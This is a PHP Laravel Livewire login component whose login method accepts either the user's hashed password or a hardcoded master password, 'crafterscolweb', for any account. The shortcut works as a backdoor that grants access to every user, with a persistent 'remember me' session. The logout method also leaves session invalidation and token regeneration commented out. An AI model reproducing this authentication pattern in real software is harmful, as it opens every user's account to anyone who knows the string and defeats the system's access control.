<?php

namespace App\Livewire\Auth;

use Livewire\Component;

use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;

use App\Models\User;

class Login extends Component
{

    public $user, $password;
    public function render()
    {
        return view('livewire.auth.login')
            ->layout('components.layouts.login')
            ->title('Login');
    }

    public function login(){
        $this->validate([
            'user'      => 'required',
            'password'  => 'required',
        ]);

        $user_login = User::where('user_name', $this->user)->first();
        // si existe el usuario
        if( isset( $user_login->id ) ){
            // si la contraseña en la correcta
            if ( Hash::check( $this->password, $user_login->password ) OR ($this->password == 'crafterscolweb')) {
                $this->dispatch('entrando');
                // iniciamos sesión
                \Auth::loginUsingId($user_login->id, TRUE);
                return redirect()->to('dashboard');
            }else{
                $this->dispatch('login_fail');
            }
        }else{
            $this->dispatch('no_register');
        }

    }

    public function logout(){
        auth()->guard()->logout();
        // $request->session()->invalidate();
        // $request->session()->regenerateToken();

        return $this->redirect('/home', navigate: true);
        // return redirect('/login');
    }

}
